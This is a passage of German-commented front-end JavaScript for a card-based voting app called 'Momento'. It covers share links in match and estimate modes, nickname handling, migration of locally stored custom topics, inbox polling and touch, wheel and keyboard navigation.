// localStorage unter "kiosk_nickname") und baut die Badge-Ansicht wieder
// auf. Aktualisiert zusätzlich den Modus-Hinweis (setShareMode), falls
// gerade der "du hast noch keinen Namen hinterlegt"-Hinweis sichtbar war.
function confirmEditShareNickname() {
  const input = document.getElementById('share-nickname-edit-input');
  const cleanName = (input?.value || '').trim() || 'KioskFan';

  localStorage.setItem('kiosk_nickname', cleanName);
  updateHeaderNickname();
  renderShareNicknameBadge();
  setShareMode(shareMode);
}

// Wechselt den Modus im Share-Modal und aktualisiert Buttons + Hinweistext.
function setShareMode(mode) {
  shareMode = mode;

  const btnMatch = document.getElementById('share-mode-btn-match');
  const btnEstimate = document.getElementById('share-mode-btn-estimate');
  const hint = document.getElementById('share-mode-hint');

  const baseCls = "py-2.5 px-2 rounded-xl text-[11px] font-black uppercase tracking-tight border transition-all leading-tight";
  const activeCls = "bg-retro-accent text-white border-retro-accent shadow-md";
  const inactiveCls = "bg-retro-subtle border-retro-border text-retro-text hover:border-retro-accent/50";

  if (btnMatch) btnMatch.className = `${baseCls} ${mode === 'match' ? activeCls : inactiveCls}`;
  if (btnEstimate) btnEstimate.className = `${baseCls} ${mode === 'estimate' ? activeCls : inactiveCls}`;

  if (!hint) return;

  if (mode !== 'estimate') {
    hint.classList.add('hidden');
    return;
  }

  hint.classList.remove('hidden');

  // Reihenfolge bewusst so gewählt: Die "noch nicht abgestimmt"-Warnung
  // blockiert das Teilen tatsächlich (siehe canShareCurrentMode()) und hat
  // deshalb Vorrang. Erst wenn abgestimmt wurde, aber noch der technische
  // Standard-Name ("KioskFan") aktiv ist, macht der charmante Hinweis zum
  // Personalisieren Sinn - ohne den Nutzer am Teilen zu hindern, denn der
  // Standard-Name funktioniert ja durchaus als Fallback.
  if (!hasOwnAnswerForCurrentCard()) {
    hint.className = "text-[11px] text-amber-500 font-bold leading-snug";
    hint.innerText = "⚠️ Stimme zuerst selbst ab – nur so kann dein Freund dich einschätzen.";
  } else if (getStoredNickname() === 'KioskFan') {
    hint.className = "text-[11px] text-retro-accent font-bold leading-snug";
    hint.innerText = "✏️ Wie soll dein Freund dich im Link erkennen? Tippe oben deinen Namen ein.";
  } else {
    hint.className = "text-[11px] text-retro-muted font-bold leading-snug";
    hint.innerText = "🎯 Dein Freund sieht deine Antwort erst nach seiner eigenen Einschätzung.";
  }
}

// Prüft, ob für die aktuelle Karte bereits eine eigene Antwort vorliegt.
function hasOwnAnswerForCurrentCard() {
  const topic = filteredTopics[currentTopicIndex];
  if (!topic) return false;
  const version = topic.versions[currentVersionIndex];
  if (!version) return false;
  return !!selectedChoice || !!localStorage.getItem(`kiosk_vote_${topic.id}_${version.id}`);
}

// Verhindert das Teilen eines Fremdeinschätzungs-Links ohne eigene Antwort,
// da sonst kein Vergleichswert (val) im Link mitgegeben werden kann.
function canShareCurrentMode() {
  if (shareMode !== 'estimate') return true;
  if (hasOwnAnswerForCurrentCard()) return true;
  alert('Bitte stimme zuerst selbst ab, bevor du den Fremdeinschätzungs-Link teilst 🎯');
  return false;
}

// Baut den Share-Link. Im Match-Modus weiterhin rein clientseitig (wie
// bisher). Im Fremdeinschätzungs-Modus wird zuerst beim Server eine Anfrage
// angelegt – der Link enthält danach nur eine anonyme shareId, NICHT mehr
// den echten Wert im Klartext. Deshalb async: das Anlegen ist ein
// Netzwerk-Aufruf.
async function generateShareUrl() {
  const currentNickname = getStoredNickname();
  const baseUrl = window.location.origin + window.location.pathname;

  const topic = filteredTopics[currentTopicIndex];
  if (!topic) return baseUrl;
  const version = topic.versions[currentVersionIndex];

  const params = new URLSearchParams({
    topic: topic.id,
    v: version.id,
    from: currentNickname,
    mode: shareMode
  });

  if (shareMode === 'estimate') {
    // Server anlegen lassen -> echter Wert steht nicht im Link.
    const result = await createEstimateShare(topic.id, version.id, currentNickname, selectedChoice);
    params.append('shareId', result.shareId);
  } else if (selectedChoice) {
    // Match-Modus: weiterhin rein informativ im Link (kein Geheimnis, dient
    // nur der Anzeige "Freund hat schon abgestimmt").
    params.append('val', selectedChoice);
  }

  return `${baseUrl}?${params.toString()}`;
}

// Blendet die beiden Share-Buttons als "beschäftigt" ein/aus, während der
// Link im Hintergrund erstellt wird (jetzt ein Netzwerk-Aufruf statt einer
// sofortigen, rein lokalen Berechnung).
function setShareButtonsBusy(isBusy) {
  const whatsappBtn = document.getElementById('btn-share-whatsapp');
  const copyBtn = document.getElementById('btn-share-copy');
  [whatsappBtn, copyBtn].forEach(btn => {
    if (!btn) return;
    btn.disabled = isBusy;
    btn.classList.toggle('opacity-50', isBusy);
    btn.classList.toggle('pointer-events-none', isBusy);
  });
}

async function shareToWhatsApp() {
  if (!canShareCurrentMode()) return;
  setShareButtonsBusy(true);
  try {
    const shareUrl = await generateShareUrl();
    const text = shareMode === 'estimate'
      ? `🎯 Wie gut kennst du mich wirklich? Schätz mich auf Momento ein!\n${shareUrl}`
      : `Ey, mach mal Vibe-Check mit mir auf Momento! 🍟👇\n${shareUrl}`;
    window.open(`https://wa.me/?text=${encodeURIComponent(text)}`, '_blank');
  } catch (err) {
    alert(`Link konnte nicht erstellt werden: ${err.message}`);
  } finally {
    setShareButtonsBusy(false);
  }
}

async function copyShareLink() {
  if (!canShareCurrentMode()) return;
  setShareButtonsBusy(true);

  let shareUrl;
  try {
    shareUrl = await generateShareUrl();
  } catch (err) {
    alert(`Link konnte nicht erstellt werden: ${err.message}`);
    setShareButtonsBusy(false);
    return;
  }

  try {
    await navigator.clipboard.writeText(shareUrl);
    alert('Link in die Zwischenablage kopiert! 🚀');
  } catch (_) {
    // Zwischenablage nicht verfügbar/erlaubt -> Fallback-Dialog zum manuellen Kopieren.
    prompt('Kopiere deinen Share-Link:', shareUrl);
  } finally {
    setShareButtonsBusy(false);
  }
}

// INITIALISIERUNG UND MIGRATION DER LOKALEN SPEICHERDATEN
try {
  let customTopics = JSON.parse(localStorage.getItem('kiosk_custom_topics') || '[]');
  customTopics.forEach(ct => {
    if (!ct.memories) ct.memories = [];

    if (ct.versions) {
      ct.versions.forEach(cv => {
        if (cv.memories && cv.memories.length > 0) {
          cv.memories.forEach(m => {
            if (!ct.memories.some(em => em.text === m.text && em.user === m.user)) {
              ct.memories.push(m);
            }
          });
          delete cv.memories;
        }

        if (cv.type === 'scale') {
          cv.type = 'versus';
          cv.leftLabel = cv.minLabel;
          cv.rightLabel = cv.maxLabel;
          delete cv.minLabel;
          delete cv.maxLabel;
          if (cv.stats && typeof cv.stats.communityAverage === 'number') {
            cv.stats.communityAverage = cv.stats.communityAverage * 10;
          }
        }
      });
    }

    const existing = masterTopics.find(mt => mt.id === ct.id);
    if (existing) {
      if (!existing.memories) existing.memories = [];
      
      ct.memories.forEach(m => {
        if (!existing.memories.some(em => em.text === m.text && em.user === m.user)) {
          existing.memories.push(m);
        }
      });

      ct.versions.forEach(cv => {
        const matchedIndex = existing.versions.findIndex(ev => ev.id === cv.id);
        if (matchedIndex !== -1) {
          existing.versions[matchedIndex] = cv; 
        } else {
          existing.versions.push(cv);
        }
      });
    } else {
      masterTopics.push(ct);
    }
  });
} catch (err) {
  console.error("Fehler beim Laden der Custom Topics:", err);
}

// Deep-Link-Kontext (inkl. eventueller Server-Anfrage für Fremdeinschätzungs-
// Links) muss feststehen, BEVOR die erste Karte gerendert wird – deshalb hier
// mit einer sofort ausgeführten async-Funktion (IIFE) auf das Ergebnis warten.
(async () => {
  await resolveMissingTopicFromServer(); // Fehlende geteilte Themen/Versionen nachladen.
  await handleDeepLinks();
  applyFiltersAndShuffle();
  pollInbox(); // Direkt beim Start prüfen, ob Freunde inzwischen geantwortet haben.
})();

// Regelmäßiges Nachfragen im Hintergrund (alle 60 Sekunden), aber nur,
// solange der Tab wirklich sichtbar ist – spart Akku/Daten, wenn die App
// im Hintergrund-Tab liegt oder das Handy gesperrt ist.
setInterval(() => {
  if (document.visibilityState === 'visible') {
    pollInbox();
  }
}, 60000);

// Zusätzlich: sofort nachfragen, sobald der Tab wieder aktiv wird (z.B.
// Nutzer kommt von einer anderen App zurück).
document.addEventListener('visibilitychange', () => {
  if (document.visibilityState === 'visible') {
    pollInbox();
  }
});

// EVENT LISTENERS (TOUCH, MOUSE, KEYBOARD)
document.addEventListener('DOMContentLoaded', () => {
  initStickerOverlay();
  
  const cardContainer = document.getElementById('card-flipper');
  let touchStartX = 0;
  let touchStartY = 0;

  if (cardContainer) {
    cardContainer.addEventListener('touchstart', (e) => {
      touchStartX = e.touches[0].clientX;
      touchStartY = e.touches[0].clientY;
    }, { passive: true });

    cardContainer.addEventListener('touchend', (e) => {
      const touchEndX = e.changedTouches[0].clientX;
      const touchEndY = e.changedTouches[0].clientY;

      const deltaX = touchStartX - touchEndX;
      const deltaY = touchStartY - touchEndY;
      const threshold = 55; 

      if (Math.abs(deltaX) > Math.abs(deltaY)) {
        if (Math.abs(deltaX) > threshold) {
          const direction = deltaX > 0 ? 'left' : 'right';
          if (!isFlipped) {
            openContribForCurrentTopic(direction);
          } else {
            toggleFlip(direction);
          }
        }
      } else {
        if (!isFlipped) {
          if (Math.abs(deltaY) > threshold) {
            if (deltaY > 0) {
              navigate('topic-next'); 
            } else {
              navigate('topic-prev'); 
            }
          }
        }
      }
    }, { passive: true });
  }

  window.addEventListener('wheel', (e) => {
    const backdrop = document.getElementById('comments-sheet-backdrop');
    if (backdrop && !backdrop.classList.contains('hidden')) {
      return; 
    }

    if (Math.abs(e.deltaY) > 35) {
      if (e.deltaY > 0) {
        navigate('topic-next'); 
      } else {
        navigate('topic-prev');
      }
    }
  }, { passive: true });

  window.addEventListener('keydown', (e) => {
    const activeTag = document.activeElement ? document.activeElement.tagName : '';
    if (activeTag === 'INPUT' || activeTag === 'TEXTAREA') {
      return; 
    }

    if (e.key === 'ArrowDown' || e.key === ' ' || e.code === 'Space') {
      e.preventDefault();
      navigate('topic-next'); 
    } else if (e.key === 'ArrowUp') {
      e.preventDefault();
      navigate('topic-prev'); 
    } else if (e.key === 'ArrowRight') {
      if (!isFlipped) {
        openContribForCurrentTopic('right');
      } else {
        toggleFlip('right');
      }
    } else if (e.key === 'ArrowLeft') {
      if (!isFlipped) {
        openContribForCurrentTopic('left');
      } else {
        toggleFlip('left');
      }
    }
  });
});